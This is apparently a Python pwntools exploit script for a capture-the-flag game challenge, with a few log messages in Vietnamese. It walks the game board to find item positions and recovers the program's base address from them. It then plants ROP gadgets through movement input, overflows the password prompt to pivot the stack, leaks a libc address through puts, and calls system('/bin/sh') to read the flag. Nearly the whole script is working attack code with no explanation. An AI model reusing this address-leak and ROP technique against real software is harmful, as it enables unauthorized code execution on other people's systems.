#!/usr/bin/python3
from pwn import *


# Edit these placeholders: ./binary ./libc.so.6 amd64
context.binary = exe = ELF("./chall_patched")
# context.log_level = 'info'
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")
context.arch = "amd64"


script = '''
b*check_flag_password+176
c
'''
# p = process(exe.path)
# p = gdb.debug(exe.path , gdbscript = script)
p = remote("chall.lac.tf" , port = 31337)
# pause()

def slog(name , addr): return success(": ".join([name , hex(addr)]))
def s(payload):
    sleep(1.5)
    p.send(payload)
def sl(payload):
    p.sendline(payload)
def sa(info , payload):
    p.sendafter(info , payload)
def sla(info , payload):
    p.sendlineafter(info , payload)
def ru(payload):
    return p.recvuntil(payload)
def rn(payload):
    return p.recvn(payload)
def rln():
    return p.recvline()

def mov(payload):
    sl(payload)



item_names = ["Sword", "Shield", "Potion", "Key", "Scroll", "Amulet", "Crown", "Flag"]
found_positions = {}
items_found = 0
cur_x, cur_y = 0, 0

ru(b'> ')
sl("look")
output = ru(b'> ')
if b"A glimmering" in output:
    for idx, name in enumerate(item_names):
        if name.encode() in output:
            found_positions[idx] = (0, 0)
            items_found += 1
for y in range(16):
    direction = "e" if y % 2 == 0 else "w"
    
    for _ in range(15):
        if direction == "e": cur_x += 1
        else: cur_x -= 1
        sl(direction)
        print(cur_x , cur_y)
        output = ru(b'> ')
        if b"You spot a" in output:
            for idx, name in enumerate(item_names):
                if name.encode() in output:
                    if idx not in found_positions:
                        found_positions[idx] = (cur_x, cur_y)
                        items_found += 1
                    break    
    if y < 15:
        sl("s")
        cur_y += 1
        output = ru(b'> ')
        if b"You spot a" in output:
            for idx, name in enumerate(item_names):
                if name.encode() in output:
                    if idx not in found_positions:
                        found_positions[idx] = (cur_x, cur_y)
                        items_found += 1
                        log.success(f"Tìm thấy {name} tại ({cur_x}, {cur_y}) - {items_found}/8")
                    break
def recover_main_addr(positions):
    sim_board = [[0 for _ in range(16)] for _ in range(16)]
    recovered_bytes = [0] * 8
    for i in range(7, -1, -1):
        if i not in positions:
            log.error(f"Thiếu tọa độ của vật phẩm index {i}!")
            return 0
            
        target_x, target_y = positions[i]
        found_byte = False
        for val in range(256):
            v4_orig = (val >> 4) & 0xF
            v3_orig = val & 0xF
            curr_v4 = v4_orig
            curr_v3 = v3_orig
            while sim_board[curr_v3][curr_v4] != 0:
                curr_v4 = (curr_v4 + 1) % 16
                if curr_v4 == 0:
                    curr_v3 = (curr_v3 + 1) % 16
            if curr_v4 == target_x and curr_v3 == target_y:
                recovered_bytes[i] = val
                sim_board[curr_v3][curr_v4] = i + 1
                found_byte = True
                break
        
        if not found_byte:
            log.warning(f"Không tìm thấy byte gốc cho item {i} tại ({target_x}, {target_y})")
    addr = u64(bytes(recovered_bytes))
    return addr

addr = recover_main_addr(found_positions)
print(hex(addr))
exe.address = addr - exe.sym.main
bss = exe.address + 0x4300
ret = exe.address + 0x000000000000101a
leave_ret = exe.address + 0x00000000000014b7
last_item = exe.address + 0x4020
ROP = exe.address + 0x4910
board = exe.address + 0x4a20
puts_got = exe.address + 0x3f98
pop_rbp= exe.address + 0x0000000000001233
slog("code base" , exe.address)
_start = "n" * 15
for i in _start:
    mov(i)
    ru(b'> ')
s(p64(pop_rbp)[:-1])
ru(b'> ')
s(p64(last_item + 0x10)[:-1])
ru(b'> ')
s(p64(exe.sym.check_flag_password + 152)[:-1])
ru(b'> ')
s(p64(pop_rbp)[:-1])
ru(b'> ')
s(p64(board + 0x8)[:-1])
ru(b'> ')
s(p64(exe.sym.check_flag_password + 152)[:-1])
ru(b'> ')
s(p64(pop_rbp)[:-1])
ru(b'> ')
s(p64(bss + 0x920)[:-1])
ru(b'> ')
s(p64(exe.sym.print_inventory)[:-1])
ru(b'> ')
s(p64(pop_rbp)[:-1])
ru(b'> ')
s(p64(bss + 0xa20)[:-1])
ru(b'> ')
s(p64(exe.sym.main + 72)[:-1])
ru(b'> ')
sl(b'grab')
sa(b'Password: ' , b'A' * 0x10 + p64(ROP) + p64(leave_ret)[:-1])
# pause()
s(p64(puts_got) + p64(0) + p64(ROP + 0x18) + p64(leave_ret)[:-1])
# pause()
s(p64(0) + p64(8) + p64(ROP + 0x30) + p64(leave_ret)[:-1])
ru(b'/300 ')
libc.address = u64(rn(6) + b'\x00' * 2) - libc.sym.puts
slog("libc base" , libc.address)
# in libc
pop_rdi = libc.address + 0x000000000010f78b
binsh = next(libc.search("/bin/sh"))
system = libc.sym.system
ru(b'> ')
s(p64(pop_rdi)[:-1])
ru(b'> ')
s(p64(binsh)[:-1])
ru(b'> ')
s(p64(system)[:-1])
ru(b'> ')
sl(b'grab')
sa(b'Password: ' , b'A' * 0x10 + p64(ROP + 0x58 + 0x10) + p64(leave_ret)[:-1])
sl(b"cat flag.txt")
p.interactive()